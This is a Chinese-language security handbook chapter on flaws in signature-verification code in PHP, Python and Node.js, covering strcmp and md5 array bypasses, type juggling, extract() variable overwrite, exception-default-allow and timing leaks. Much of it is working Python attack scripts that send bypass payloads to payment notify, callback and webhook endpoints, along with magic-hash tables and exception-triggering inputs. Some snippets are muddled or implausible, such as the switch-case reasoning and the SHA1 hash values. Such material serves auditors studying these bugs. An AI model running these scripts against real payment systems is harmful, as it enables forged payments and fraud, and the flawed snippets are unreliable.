# Signature Implementation Bugs — 签名实现缺陷深度手册

> 签名算法选对了，但实现写错了 = 签名不存在。本章覆盖各语言实现层面的经典漏洞，每类配有可复现的攻击脚本。

## 0. 签名验证实现全景

```
┌─────────────────────────────────────────────────────────────────┐
│                     签名验证实现攻击面                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. PHP 实现缺陷                                                 │
│     ├─ strcmp/memcmp 数组绕过 (NULL == 0)                        │
│     ├─ Type Juggling ("0e..." == "0e...", 0 == "any")            │
│     ├─ extract/parse_str/$$ 变量覆盖                            │
│     └─ md5/sha1 数组绕过 ([] → NULL)                            │
│                                                                 │
│  2. Python 实现缺陷                                              │
│     ├─ hmac.compare_digest vs == / !=                           │
│     ├─ int()/float() coercision                                  │
│     ├─ 异常导致的默认 allow                                       │
│     └─ 复杂类型序列化差异                                        │
│                                                                 │
│  3. Node.js/JavaScript 实现缺陷                                   │
│     ├─ == vs === 与类型强制                                      │
│     ├─ Buffer vs string 比较                                     │
│     ├─ Timing-safe 缺失                                          │
│     └─ JSON.parse 边角案例                                       │
│                                                                 │
│  4. Java 实现缺陷                                                │
│     ├─ String.equals() vs constant-time                          │
│     ├─ Arrays.equals() 时序                                      │
│     ├─ BigInteger 边角                                           │
│     └─ Null 处理                                                 │
│                                                                 │
│  5. 跨语言通用缺陷                                               │
│     ├─ Early return timing                                       │
│     ├─ Exception → skip verification                             │
│     ├─ Boolean coercion                                          │
│     ├─ Truncation                                                │
│     ├─ Charset/encoding                                          │
│     └─ Null byte truncation                                      │
│                                                                 │
│  6. 时间盲注签名恢复                                              │
│     └─ 完整时序攻击脚本                                           │
│                                                                 │
│  7. 完整审计脚本                                                  │
│     └─ implementation_audit.py                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 1. PHP 实现缺陷

### 1.1 strcmp/memcmp 数组绕过

PHP 的 `strcmp()` 以及相关字符串函数在接收到数组参数时返回 `NULL`，而 `NULL == 0` 为 `true`。

```php
<?php
// ===== 漏洞代码 =====
// if (strcmp($user_sign, $correct_sign) == 0) { verify(); }

// ===== 利用 =====
// POST sign[]=anything
// strcmp(["anything"], "abc123") → NULL
// NULL == 0 → true → verify() 被调用!
var_dump(strcmp([], "anything"));    // NULL
var_dump(NULL == 0);                 // bool(true)
```

```python
# php_strcmp_bypass.py — strcmp/strcasecmp 全参数绕过
import requests

def test_strcmp_bypass(base_url: str):
    """对每个目标路径测试 strcmp 数组绕过"""
    paths = [
        "/notify", "/callback", "/webhook",
        "/pay/return", "/pay/notify",
        "/api/verify", "/api/callback",
    ]
    # 所有可能的签名字段名
    sign_fields = [
        "sign", "signature", "sig", "token",
        "auth_token", "verify", "checksum",
        "hash", "hmac", "sign_data", "signStr",
    ]

    for path in paths:
        for field in sign_fields:
            # GET 传数组: sign[]=x
            try:
                r = requests.get(base_url + path, params={
                    field: "anything",       # ← 带 [] 的字段
                    "order_id": "TEST",
                    "status": "success",
                    **{f"{field}[]": "x"},    # ← PHP 数组参数
                }, timeout=10, allow_redirects=False)
                if r.status_code == 200 and "fail" not in r.text.lower():
                    key = f"{field}[]=x"
                    print(f"[!] strcmp GET bypass: {path} via {key}  ({r.status_code})")

                # POST JSON: 传数组
                r = requests.post(base_url + path, json={
                    "order_id": "TEST",
                    "status": "paid",
                    field: ["anything"],       # ← JSON 数组
                }, timeout=10)
                if r.status_code == 200 and "fail" not in r.text.lower():
                    print(f"[!] strcmp POST JSON bypass: {path} via {field}=[]  ({r.status_code})")

                # POST form: sign[]=x
                r = requests.post(base_url + path,
                    data={f"{field}[]": "x", "order_id": "TEST", "status": "paid"},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=10)
                if r.status_code == 200 and "fail" not in r.text.lower():
                    print(f"[!] strcmp POST form bypass: {path} via {field}[]=x  ({r.status_code})")
            except Exception as e:
                pass


# ===== 扩展: 受影响的其他 PHP 函数 =====
AFFECTED_FUNCTIONS = {
    "strcmp":       "strcmp([], 'x')       → NULL == 0 → true",
    "strcasecmp":   "strcasecmp([], 'x')   → NULL == 0 → true",
    "strpos":       "strpos([], 'x')       → NULL == 0 → true  (if check: !== false)",
    "stripos":      "stripos([], 'x')      → NULL == 0 → true",
    "strlen":       "strlen([])            → NULL + warning",
    "in_array":     "in_array('x', [])     → false (safe) 但 in_array(0, ['x']) → true",
    "array_search": "array_search('x', []) → false (safe)",
    "sha1":         "sha1([])              → NULL",
    "md5":          "md5([])               → NULL",
}
```

### 1.2 md5/sha1 数组绕过

PHP 的 `md5()` 和 `sha1()` 不接受数组参数，传入数组时返回 `NULL`。如果两个签名都是 `NULL`，则 `NULL === NULL` 为 `true`，完全绕过签名验证。

```php
<?php
// ===== 漏洞代码 =====
// if (md5($_POST['data']) === $expected_hash) { ... }
// if (sha1($payload) == $expected_sign) { ... }

// ===== 利用 =====
// POST data[]=anything → md5(["anything"]) → NULL
// 如果 expected_hash 是字符串 "abc123" → NULL === "abc123" → false (严格比较)
// 如果 expected_hash 也是 NULL 或使用 == 比较 → 绕过

// 最强的绕过: 如果两个输入都传数组:
// POST data1[]=x&data2[]=y
// → md5($_POST['data1']) === md5($_POST['data2'])
// → NULL === NULL → true!
```

```python
# php_md5_sha1_array_bypass.py — md5/sha1 数组绕过
def test_hash_array_bypass(base_url: str):
    """针对 md5/sha1 比较的数组绕过"""
    paths = [
        "/notify", "/callback", "/webhook",
        "/verify", "/api/verify", "/api/sign/check",
    ]

    for path in paths:
        # ==== 场景 1: 签名字段传数组 ====
        # 后端: if (md5($_POST['sign']) == $expected)
        for sign_field in ["sign", "signature", "hash", "token"]:
            r = requests.post(base_url + path, json={
                "order_id": "TEST",
                "status": "paid",
                sign_field: ["injected"],       # ← JSON 数组 → md5(["injected"]) → NULL
            }, timeout=10)
            if r.status_code == 200 and "fail" not in r.text.lower():
                print(f"[!] md5 array bypass: {path} via {sign_field}=[]  ({r.status_code})")

        # ==== 场景 2: 两个数组值 ====
        # 后端: if (md5($_POST['a']) === md5($_POST['b']))
        # POST a[]=1&b[]=2 → md5([]) === md5([]) → NULL === NULL → true
        r = requests.post(base_url + path,
            data="a[]=1&b[]=2",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=10)
        if r.status_code == 200 and "fail" not in r.text.lower():
            print(f"[!] md5 dual array bypass: {path}  ({r.status_code})")

        # ==== 场景 3: sha1 数组 ====
        r = requests.post(base_url + path, json={
            "data": ["payload"],               # sha1(["payload"]) → NULL
            "expected": "reserved_value",       # == 比较下 NULL == "" → 可能 true
        }, timeout=10)
        if r.status_code == 200 and "fail" not in r.text.lower():
            print(f"[!] sha1 array bypass: {path}  ({r.status_code})")

    # AJAX 返回: (仅用于理解，不执行)
    return """
    要点:
    - md5([]) 返回 NULL, sha1([]) 返回 NULL
    - 如果两个比较值都是 NULL → PHP 8.0 以前 == 为 true, === 也为 true
    - 传 data[]=x 给 md5() → 绕过
    - 使用 PHP 8.0+ 时, string 函数对数组抛出 TypeError 而非 warning
    - 但如果在 try/catch 中: catch {} → 可能 fallback 到允许通过
    """
```

### 1.3 PHP Type Juggling — == vs ===

PHP 的宽松比较（`==`）是签名实现的最大漏洞源。

```python
# php_type_juggling.py — PHP 宽松比较完全利用

# ===== 1. Magic Hash 攻击 =====
# "0e462097..." == "0e848240..." → true (都是 0×10^n)
# 如果签名比较用 ==:   if (md5($input) == $stored_hash)
# 找到一个 md5() 结果以 "0e" 开头的输入 → 永远匹配

MAGIC_HASHES = {
    # === MD5: 原文 → hash → 攻击方法 ===
    "240610708":    "0e462097431907509062922748828256",
    "QNKCDZO":      "0e830400451993494058024219903391",
    "aabg7XSs":     "0e087386482136013740957780965295",
    "aabC9RqS":     "0e041022518165728065344349536299",
    "s878926199a":  "0e545993274517709034328855841020",
    "s155964671a":  "0e342768416822451524974117254469",
    "s214587387a":  "0e848240448830537924465865611904",
    "s1091221200a": "0e940624217856561557816327384675",
    "s1885207154a": "0e509367213418206700842008763514",
    "s1502113478a": "0e861580163291561247404381396064",
    "s1836677006a": "0e481036490867661113260034900752",
    "s1184209335a": "0e072485820392773389523109082030",
    "s1665632922a": "0e731198061491163073197128363787",
    "s1501420657a": "0e342624769297644179755014271379",

    # === SHA1 magic hashes ===
    "aaroZmOk":     "0e66507019969427134894567494305185566735",
    "aaK1STfY":     "0e76658526655756207688271159624026011393",
    "aaO8zKZF":     "0e89257456677279068558073954252716165668",
    "aa3OFF9m":     "0e36977786278517984959260394024281014729",
    "aabGO3lv":     "0e56385541292084511850722099612592363477",
    "abD5L1vd":     "0e92542723894939923592906221721206871645",
}

def find_magic_hash_pair():
    """找出任意两个碰撞的 magic hash → == 比较下永远相等"""
    hashes = list(MAGIC_HASHES.values())
    print(f"[*] Found {len(MAGIC_HASHES)} magic hashes")
    print(f"[*] Any two hash values: {hashes[0][:25]}... == {hashes[1][:25]}... → TRUE")
    print(f"[*] Exploit: POST sign={hashes[0][:25]}... → == comparison bypass")


# ===== 2. 0 == "任意非数字字符串" =====
def test_zero_equality():
    """PHP 中 0 == "any_string" 总是 true"""
    print("\n[*] 0 == string_string:")
    for s in ["paid", "success", "admin", "verified",
              "true", "complete", "delivered", "confirmed"]:
        # PHP: 0 == "paid" → true
        print(f"    0 == \"{s}\" → TRUE")

    # 实际利用场景:
    SCENARIOS = [
        # 场景: 后端 if ($_POST['amount'] == 0) → 免费
        # 如果传入 amount=abc → (int)"abc" → 0 → 0 == 0 → true → 免费!
        {"field": "amount", "payload": "abc", "reason": "(int)\"abc\" → 0"},
        {"field": "amount", "payload": "",     "reason": "(int)\"\" → 0"},
        {"field": "amount", "payload": "null", "reason": "(int)\"null\" → 0"},

        # 场景: if ($row['status'] == $input['status'])
        # 如果 $row['status'] = "paid", $input['status'] = 0
        # → "paid" == 0 → true (PHP < 8.0)
        {"field": "status", "payload": 0,    "reason": "\"paid\" == 0 → true"},
        {"field": "status", "payload": "0",  "reason": "\"paid\" == \"0\" → false (双字符串)"},

        # 场景: if (in_array($input['role'], $allowed_roles))
        # in_array(0, ['admin', 'user']) → true!
        {"field": "role", "payload": 0, "reason": "in_array(0, ['admin']) → true"},
    ]
    for s in SCENARIOS:
        print(f"    {s['field']}={repr(s['payload'])}  // {s['reason']}")


# ===== 3. in_array() 的宽松比较 =====
def test_in_array_juggle():
    """in_array() 默认使用宽松比较"""
    print("\n[*] in_array() type juggling:")
    # in_array(0, ['admin', 'paid_user', 'vip']) → TRUE
    # in_array("0", ['admin']) → FALSE  (字符串比较)
    print("    in_array(0, ['admin'])         → TRUE    ← 绕过!")
    print("    in_array(\"0\", ['admin'])      → FALSE")
    print("    in_array(false, ['admin'])     → TRUE")
    print("    in_array(null, ['admin'])      → TRUE" if False else "")
    print("    in_array('admin', [0])         → TRUE    ← 双向的!")

    # 安全写法:
    print("\n    [安全] in_array($v, $a, true)  // strict=true 第三参数")


# ===== 4. switch/case 宽松比较 =====
def test_switch_juggle():
    """PHP switch 使用 == 比较"""
    print("\n[*] switch/case loose comparison:")
    print("""
    switch ($input) {
        case "paid":   deliver(); break;
        case "admin":  elevate(); break;
    }

    // 输入:
    switch(0)     → 匹配 case "0"?  no → 匹配第一个不匹配的?  no
    // 关键: switch(0) 不会匹配 "paid" 或 "admin"
    // 但是 switch("0abc") → 会被转为 "0" → 可能匹配 case "0"
    """)


MAGIC_HASH_DICT = list(MAGIC_HASHES.values())
```

### 1.4 extract() / parse_str() / $$ 变量覆盖

```python
# php_variable_overwrite.py — 变量覆盖绕过签名验证

# ===== extract() — 数组到变量的直接覆盖 =====
VULNERABLE_CODE = """
<?php
// 经典漏洞代码:
extract($_POST);

// 现在 $trade_status, $sign, $amount 等变量直接被覆盖
if ($trade_status == 'TRADE_SUCCESS' && verify_sign($sign)) {
    deliver($order_id);
}
// → POST trade_status=TRADE_SUCCESS → 直接覆盖
?>
"""

def test_extract_bypass(base_url: str):
    """利用 extract() 变量覆盖"""
    # 如果后端用了 extract($_POST) 或 extract($_REQUEST):
    OVERWRITES = [
        # 支付状态
        {"trade_status": "TRADE_SUCCESS"},
        {"status": "paid"},
        {"payment_status": "completed"},
        {"order_status": "delivered"},

        # 管理员字段
        {"admin": "1"},
        {"is_admin": True},
        {"role": "admin"},

        # 验证绕过
        {"verified": True, "skip_verification": True},
        {"sign_verified": True},
        {"_validate": False},
        {"validate_signature": False},

        # 金额覆盖
        {"amount": "0.01", "total_amount": "0.01",
         "price": "0.01"},

        # 覆盖 verify_sign 函数结果 (如果 extract 在 include 之前)
        {"verify_sign": "return true;"},  # 很少见，但可能
    ]

    paths = [
        "/notify", "/callback", "/webhook",
        "/pay/notify", "/payment/notify",
        "/return", "/api/callback",
    ]

    for path in paths:
        for data in OVERWRITES:
            # extract($_POST) 接收 form data 或 JSON (取决于框架)
            r = requests.post(base_url + path, data=data, timeout=10)
            if r.status_code == 200 and "fail" not in r.text.lower():
                print(f"[!] extract bypass: {path} | {data}  → {r.status_code}")

            # JSON 形式
            r = requests.post(base_url + path, json=data, timeout=10)
            if r.status_code == 200 and "fail" not in r.text.lower():
                print(f"[!] extract JSON bypass: {path} | {data}  → {r.status_code}")


# ===== parse_str() — 无第二参数 =====
def test_parse_str_bypass():
    """parse_str() 无第二参数时 = extract()"""
    print("""
    // ===== 漏洞代码 =====
    $query_string = $_SERVER['QUERY_STRING'];
    parse_str($query_string);       // ← 无第二参数!
    // 现在 $trade_status, $sign 都直接从 URL 参数变成变量

    // ===== 利用 =====
    // GET /notify?trade_status=TRADE_SUCCESS&sign=anything
    // → $trade_status = "TRADE_SUCCESS"
    // → $sign = "anything"
    // → if ($trade_status == 'TRADE_SUCCESS' && verify_sign($sign)) → 绕过

    // ===== parse_str 的特殊行为 =====
    // parse_str("a[0]=1&a[1]=2") → 创建数组 $a
    // parse_str("a.b=1")         → 创建 $a_b = "1" (点变为下划线)
    // 但 parse_str("a.b=1") in PHP 8.0 → 行为不同!
    """)


# ===== $$ 变量覆盖 (register_globals 遗风) =====
def test_dollar_dollar_bypass():
    """$$ 变量覆盖绕过"""
    print("""
    // ===== 漏洞代码 =====
    // 来自遗留代码或隐式传参:
    foreach ($_POST as $key => $value) {
        $$key = $value;                   // ← 变量变量覆盖!
    }

    // 或更隐蔽的:
    // 某些框架的 extract 行为

    // 甚至可以是:
    // $_GET → parse_str → extract → 多层嵌套

    // ===== 利用 =====
    // POST GLOBALS[admin]=1 → $$key = $GLOBALS; $$GLOBALS 不可能...
    // 但是 _POST[0]=value → $$key 就是 $_POST[0]
    // 真正有用的是:

    // 1. 覆盖签名校验函数声明? 不可能（函数不能覆盖）
    // 2. 覆盖配置变量:
    //    POST db_pass=test → $db_pass 被覆盖
    // 3. 覆盖 include 路径:
    //    POST config_file=./evil.php → include $config_file → RCE
    """)
```

## 2. Python 实现缺陷

### 2.1 hmac.compare_digest vs == / !=

```python
# python_timing.py — Python 签名比较缺陷

import hmac
import hashlib
import time
import statistics

# ===== 漏洞模式 1: 直接用 == 比较 =====
VULN_CODE_1 = """
# 漏洞: 用 == 比较签名 → 不防时序
if user_sign == correct_sign:
    verify()
"""
# 这是最简单的时序攻击入口


# ===== 漏洞模式 2: 用 != 比较 =====
VULN_CODE_2 = """
# 漏洞: 用 != 比较 → 同样有时序问题
if user_sign != correct_sign:
    return "invalid"
else:
    verify()
"""


# ===== 漏洞模式 3: 用 len() 提前退出 =====
VULN_CODE_3 = """
# 漏洞: 先比较长度 → 泄漏长度!
if len(user_sign) != len(correct_sign):
    return "invalid"            # ← 长度不同时返回更快
# → 攻击者可以推断正确签名的长度!
"""


# ===== 安全写法 =====
SAFE_CODE = """
# 安全: hmac.compare_digest() 是恒定时间的
if hmac.compare_digest(user_sign, correct_sign):
    verify()
else:
    return "invalid"
"""


# ===== 实测验证 =====
def demo_timing_difference():
    """演示 == 和 compare_digest 的时序差异"""
    correct = b"a" * 32
    wrong_first = b"b" + b"a" * 31
    wrong_last  = b"a" * 31 + b"b"

    def eq_compare(sig):
        for i in range(100000):
            _ = sig == correct

    def digest_compare(sig):
        for i in range(100000):
            _ = hmac.compare_digest(sig, correct)

    # == 比较的时序差异:
    t1 = time.perf_counter()
    eq_compare(wrong_first)   # 第一个字节就不同，很快返回
    t2 = time.perf_counter()
    eq_compare(wrong_last)    # 最后一个字节才不同，慢很多
    t3 = time.perf_counter()

    first_diff = t2 - t1
    last_diff  = t3 - t2
    print(f"[==] first byte diff: {first_diff:.4f}s")
    print(f"[==] last byte diff:  {last_diff:.4f}s")
    print(f"[==] timing leak:     {last_diff - first_diff:.4f}s ← 可测量!")

    t1 = time.perf_counter()
    digest_compare(wrong_first)
    t2 = time.perf_counter()
    digest_compare(wrong_last)
    t3 = time.perf_counter()
    print(f"[digest] first byte diff: {t2-t1:.4f}s")
    print(f"[digest] last byte diff:  {t3-t2:.4f}s")
    print(f"[digest] timing leak:     {t3-t2-(t2-t1):.4f}s ← 恒定时间")


if __name__ == "__main__":
    demo_timing_difference()
```

### 2.2 int() / float() 类型强制异常

```python
# python_type_coercion.py — Python 类型强制绕过

# ===== 漏洞模式: int() 转换后的比较 =====
def python_int_coercion():
    """Python int() 类型强制与签名绕过"""

    # ——— 场景 1: 金额比较 ———
    # if float(user_amount) == order_amount:
    # float("0") → 0.0
    # float("0.00") → 0.0
    # float("1e-9") → 1e-9 (不等于 0!)
    # float("NaN") → nan (nan == nan → False!)
    # float("Infinity") → inf
    # float("") → ValueError!

    print("Python float coercion bypasses:")
    cases = {
        "0":         float("0") == 0,
        "0.00":      float("0.00") == 0,
        "0e0":       float("0e0") == 0,
        "0e999":     float("0e999") == 0,  # overflow to inf!
        "NaN":       float("NaN") == float("NaN"),  # False!
        "inf":       float("inf") > 0,
    }
    for val, result in cases.items():
        print(f"  float(\"{val}\") == 0? {result}")

    # ——— 场景 2: int() 的安全绕过 ———
    # int("0x64") → ValueError (Python, 不像 PHP 解析 hex)
    # int("0b1010") → 10 (Python 解析 binary)
    # int("0o144") → 100 (Python 解析 octal)
    # int("10_000") → 10000 (underscore)
    # int("+100") → 100
    # int(" 100 ") → 100 (strip whitespace)
    # int("1_0_0") → 100
    print("\nPython int() edge cases:")
    for val in ["0x64", "0b1010", "0o144", "10_000", "+100", " 100 "]:
        try:
            result = int(val)
            print(f"  int(\"{val}\") → {result}")
        except ValueError:
            print(f"  int(\"{val}\") → ValueError")

    # ——— 场景 3: Decimal 与 float 混用 ———
    from decimal import Decimal, getcontext
    getcontext().prec = 50

    # float 0.1 不是精确的 0.1
    # Decimal("0.1") 是精确的
    # 但比较时: Decimal("0.1") == 0.1 → TypeError 或 False
    # 如果 try/except 没处理: 后面的逻辑可能 default allow

    print("\nDecimal gotchas:")
    print(f"  Decimal('0.1') == float(0.1)   → {Decimal('0.1') == 0.1}")
    # 输出: False (类型不同)
    print(f"  Decimal('0.1') == Decimal(0.1) → {Decimal('0.1') == Decimal(0.1)}")
    # 输出: False (float 0.1 不精确)


# ===== 漏洞模式: 异常处理导致默认 allow =====
def python_exception_default_allow():
    """异常导致签名验证被跳过"""
    print("""
    // ==== 漏洞代码 ====
    def verify_sign(user_input, secret):
        try:
            expected = compute_hmac(user_input['data'], secret)
            return user_input['sign'] == expected
        except Exception:
            return True  # ← 异常时默认允许!
    """)

    # 触发异常的 payload:
    TRIGGERS = [
        # TypeError: 字符串 + dict
        {"data": {"nested": "object"}, "sign": "x"},

        # AttributeError: NoneType
        {"data": None, "sign": "x"},

        # KeyError: 缺少 key
        {"other_field": "x", "sign": "y"},

        # ValueError: 转换失败
        {"data": float('nan'), "sign": "z"},

        # UnicodeDecodeError
        {"data": b"\xff\xfe", "sign": "w"},

        # RecursionError: 深度嵌套
        {"data": {"x": {"y": {"z": {"w": {}}}}}, "sign": "v"},

        # OverflowError
        {"data": 10**1000, "sign": "u"},

        # MemoryError: 超大 payload
        {"data": "x" * 10**8, "sign": "t"},
    ]

    for t in TRIGGERS:
        try:
            # 模拟: 校验前尝试解析/处理 payload → 异常 → 默认 allow
            # 如果后端 catch Exception: return True
            data = t["data"]
            sign = t["sign"]
            # ... 实际校验 ...
            _ = sign == "expected"  # 这行不会执行到
        except Exception as e:
            print(f"  Exception: {type(e).__name__} → 默认 allow!")
            # 这就是漏洞: 异常时返回 True


# ===== 漏洞模式: None vs 空字符串 =====
def python_none_vs_empty():
    """None 与空字符串的混淆"""
    print("""
    // Python 中 None 和 "" 的比较:

    None == ""      → False  (安全，不会混淆)
    bool(None)      → False
    bool("")        → False
    str(None)       → "None"  ← 可能被哈希!
    str("")         → ""

    // 陷阱: str(None) → "None" 作为 HMAC 输入
    // 如果某个字段是 None, 但被 str() 后签名:

    import hmac
    data = str(None)  # "None"
    sign = hmac.new(key, data.encode(), hashlib.sha256).hexdigest()
    // 攻击者可以重现这个签名!
    """)


# ===== 漏洞模式: 复杂类型序列化差异 =====
def python_serialization_gotchas():
    """复杂类型转换为字符串进行签名时的差异"""
    print("""
    // Python 序列化签名时的问题:

    // 1. dict 顺序:
    // json.dumps({"a":1, "b":2})  ≠  json.dumps({"b":2, "a":1})
    // 但 dict 在 Python 3.7+ 有序 → 实际中可能会搞错

    // 2. 嵌套对象 str() 差异:
    str({"a": 1})           → "{'a': 1}"
    json.dumps({"a": 1})    → '{"a": 1}'

    // 3. bool 的子类:
    True == 1     → True
    False == 0    → True
    hash(str(True))  ≠  hash(str(1))

    // 4. tuple vs list:
    str((1,2))    → "(1, 2)"
    str([1,2])    → "[1, 2]"
    // 如果签名时用 str() 但验证时用 json, 签名不一致
    """)
```

### 2.3 Secret 泄漏与签名伪造

```python
# python_secret_leak.py — Python 签名密钥泄露

def python_secret_exposure():
    """Python 常见签名密钥泄露场景"""
    print("""
    // Secret 泄露路径:

    // 1. 环境变量泄露 (debug 端点)
    os.environ.get('SECRET_KEY')  // /debug/env, /info, /status

    // 2. Python 模块的 __pycache__ 缓存
    // 如果 secret 是常量: 在 .pyc 里

    // 3. Django settings 泄露
    // from django.conf import settings
    // settings.SECRET_KEY  // 通过 debug 500 页、Django debug toolbar

    // 4. Flask debug 模式
    // app.run(debug=True)  // 暴露控制台

    // 5. 异常回溯中的参数
    // ValueError: ... 可能在日志中打印了签名参数

    // 6. Pickle 反序列化
    // pickle.loads(user_input)  → 可以读取任意属性 → RCE
    """)

    # 真实场景:
    print("    FastAPI /docs  → API 文档泄露签名参数")
    print("    Django /admin/ → 管理界面")
    print("    Flask /console → Werkzeug debug 控制台")
    print("    .env / config.py / docker-compose.yml 泄漏")
```

## 3. Node.js / JavaScript 实现缺陷

### 3.1 === vs == 与类型强制

```javascript
// js_type_coercion.js — JavaScript 签名比较缺陷

// ===== 1. == 与 === 的区别 =====
console.log("=== JS == vs === in signature verification ===");

// === 安全 (类型+值都检查)
// == 危险 (类型强制)

// 以下 == 比较全部为 true:
console.log("'' == false:      ", '' == false);       // true
console.log("'0' == false:     ", '0' == false);      // true
console.log("0 == '':          ", 0 == '');           // true
console.log("0 == '0':         ", 0 == '0');          // true
console.log("[] == false:      ", [] == false);        // true
console.log("null == undefined:", null == undefined);  // true
console.log("[1] == 1:         ", [1] == 1);          // true
console.log("[1,2] == NaN:     ", [1,2] == NaN);      // false (NaN != 一切)

// 致命场景:
// if (user_input.sign == stored_sign) {
//   user_input.sign = "0" → "0" == <任何以数字开头的签名?> 不, 但:
//   if (stored_sign == null)  →  user_input.sign == null → true!
//   if (stored_sign == false) →  "0" == false → true!
// }

// ===== 2. parseInt/parseFloat 的诡异行为 =====
console.log("\n=== parseInt/parseFloat 边角 ===");

console.log('parseInt("0x64"):     ', parseInt("0x64"));     // 100
console.log('parseInt("  100  "):  ', parseInt("  100  "));  // 100
console.log('parseInt("0e0"):      ', parseInt("0e0"));      // 0
console.log('parseInt("0.1e1"):    ', parseInt("0.1e1"));    // 0
console.log('parseInt("08"):       ', parseInt("08"));       // 8 (ES5 strict 前是 0)
console.log('parseFloat("0.1e1"):  ', parseFloat("0.1e1"));  // 1
console.log('parseFloat("NaN"):    ', parseFloat("NaN"));    // NaN
console.log('parseFloat("Infinity"):', parseFloat("Infinity")); // Infinity

// ===== 3. Array → String coercion =====
console.log("\n=== Array toString coercion ===");
console.log('["a","b"].toString():   ', ["a","b"].toString());  // "a,b"
console.log('[].toString():          ', [].toString());         // ""  ← 空数组变空字符串!
console.log('[null].toString():      ', [null].toString());     // ""
console.log('[undefined].toString(): ', [undefined].toString());// ""
console.log('[[],[]].toString():     ', [[],[]].toString());    // ","
console.log('[1,[2,3]].toString():   ', [1,[2,3]].toString());  // "1,2,3"

// 利用: 如果签名对 JSON body 做 JSON.stringify(body) 然后 HMAC
// body = { amount: 100, items: [] }
// JSON.stringify(body) → '{"amount":100,"items":[]}'
// 但如果 items 是嵌套数组, toString() 的不可预测行为

// ===== 4. Object → string coercion =====
console.log("\n=== Object toString ===");
console.log('({}).toString():       ', ({}).toString());           // "[object Object]"
console.log('({a:1}).toString():    ', ({a:1}).toString());        // "[object Object]"
console.log('Object([1,2,3]):       ', Object([1,2,3]).toString()); // "1,2,3"
```

### 3.2 Buffer vs String 比较

```javascript
// js_buffer_comparison.js — Buffer/string 比较陷阱

// ===== 1. Buffer.from() 编码差异 =====
console.log("=== Buffer 编码 ===");

// 默认 utf8
const buf1 = Buffer.from("hello", "utf8");   // <Buffer 68 65 6c 6c 6f>
const buf2 = Buffer.from("hello", "hex");     // <Buffer > (解码错误)
const buf3 = Buffer.from("hello", "base64");  // <Buffer 85> (base64 decode)
const buf4 = Buffer.from("hello", "latin1");  // <Buffer 68 65 6c 6c 6f>

// 关键: 不同的编码产生不同的 buffer!
// 如果签名生成时用 utf8, 验证时用 hex → 签名不一致!

// ===== 2. Buffer 和 string 的 == 比较 =====
const buf = Buffer.from("abc123");
const str = "abc123";

console.log("Buffer == string:  ", buf == str);        // true (Buffer.valueOf() 触发 toString)
console.log("Buffer === string: ", buf === str);       // false (类型不同)
console.log("Buffer.equals():   ", buf.equals(Buffer.from(str))); // true

// 陷阱: == 可能隐式调用 toString()
// 但如果 buffer 内容是二进制数据 (签名通常是 hex 或 base64)
// Buffer.from("deadbeef", "hex") == "deadbeef" → false
// 因为 buf.toString('hex') → "deadbeef" 才匹配

// ===== 3. Buffer 的不同表示 =====
console.log("\n=== Buffer representations ===");
const sig = Buffer.from([0xde, 0xad, 0xbe, 0xef]);
console.log("sig.toString('hex'):    ", sig.toString('hex'));      // "deadbeef"
console.log("sig.toString('base64'): ", sig.toString('base64'));    // "3q2+7w=="
console.log("sig.toString('latin1'): ", sig.toString('latin1'));    // binary string
console.log("sig.toString('utf8'):   ", sig.toString('utf8'));      // garbled

// 如果签名比较时忘记 .toString('hex'):
// sig == "deadbeef" → false (因为 sig 是对象)

// ===== 4. 字符编码不一致 =====
// 后端: HMAC(secret, data).toString('hex')
// 但如果比较时用了不同的编码:
// HMAC 结果 0xDEAD → hex: "dead"
// HMAC 结果 0xDEAD → base64: "3q0="
// → 签名永远不匹配!

console.log("\n=== 编码不一致的典型表现 ===");
console.log("服务端编码: hex → 'a1b2c3d4'");
console.log("客户端编码: base64 → 'obLD1A=='");
console.log("两个字符串完全不同 → 签名验证永远失败");
console.log("但如果服务端 fallback: 出错时返回 200 → 绕过!");
```

### 3.3 Timing-safe Compare 缺失

```javascript
// js_timing.js — JavaScript 时序攻击

// ===== 漏洞模式: 字节级比较 =====
function timing_vuln(user_sig, correct_sig) {
    // 漏洞: 一旦发现不同字节立即返回
    for (let i = 0; i < correct_sig.length; i++) {
        if (user_sig[i] !== correct_sig[i]) {
            return false;  // ← 时序泄露!
        }
    }
    return true;
}

// ===== 安全做法: timing-safe =====
const { timingSafeEqual } = require('crypto');

function timing_safe(user_sig, correct_sig) {
    // 先比较长度，长度不同直接返回 (但泄漏长度)
    if (user_sig.length !== correct_sig.length) {
        // 需要 padding 到等长再做 timing-safe 比较
        const maxLen = Math.max(user_sig.length, correct_sig.length);
        const buf1 = Buffer.alloc(maxLen, user_sig, 'utf8');
        const buf2 = Buffer.alloc(maxLen, correct_sig, 'utf8');
        return timingSafeEqual(buf1, buf2);
    }
    return timingSafeEqual(
        Buffer.from(user_sig),
        Buffer.from(correct_sig)
    );
}

// ===== 测试 =====
const correct = "abcdef1234567890";
const wrong_1 = "bbcdef1234567890";  // 第 1 字节不同
const wrong_15 = "abcdef123456789f"; // 最后 1 字节不同

function measure_time(fn, sig) {
    const start = process.hrtime.bigint();
    for (let i = 0; i < 100000; i++) {
        fn(sig, correct);
    }
    return Number(process.hrtime.bigint() - start) / 1e6;
}

console.log("\n=== Timing attack measurement (100k iterations) ===");
console.log("vuln first byte wrong: ", measure_time(timing_vuln, wrong_1).toFixed(2), "ms");
console.log("vuln last byte wrong:  ", measure_time(timing_vuln, wrong_15).toFixed(2), "ms");
console.log("safe first byte wrong: ", measure_time(timing_safe, wrong_1).toFixed(2), "ms");
console.log("safe last byte wrong:  ", measure_time(timing_safe, wrong_15).toFixed(2), "ms");
```

### 3.4 JSON.parse 边角案例

```javascript
// js_json_parse_edge.js — JSON.parse 边角利用

// ===== 1. __proto__ pollution =====
const payload1 = JSON.parse('{"__proto__": {"admin": true}}');
// payload1.__proto__.admin  → true (原型污染)

// 如果签名验证对象是 Object.create(null) (无原型) → 安全
// 如果是普通 {} → prototype chain 可被污染

// ===== 2. JSON.parse 接收奇怪的类型 =====
const parse_nan = JSON.parse("NaN");          // NaN (某些 JSON 实现)
const parse_inf = JSON.parse("Infinity");     // Infinity
const parse_hex = JSON.parse('"\\u0041"');    // "A" (unicode escape)
const parse_zero = JSON.parse('"\\u0030"');   // "0"

// ===== 3. 重复 key =====
const dup = JSON.parse('{"a":1,"a":2}');
console.log("Duplicate key 'a':", dup.a);  // 2  (后面的覆盖前面的)

